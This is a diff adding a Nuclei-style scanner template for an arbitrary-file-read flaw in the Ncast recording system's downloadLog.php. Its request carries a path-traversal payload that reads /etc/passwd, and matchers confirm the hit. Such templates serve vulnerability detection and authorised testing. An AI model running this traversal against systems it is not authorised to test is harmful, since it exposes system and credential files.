@@ -1,0 +1,29 @@
+id: poc-yaml-ncast-downloadlog-php-anyfile-read
+info:
+  name: Ncast高清智能录播系统 downloadLog.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/developLog/downloadLog.php?name=../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "filename=\"passwd\""
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
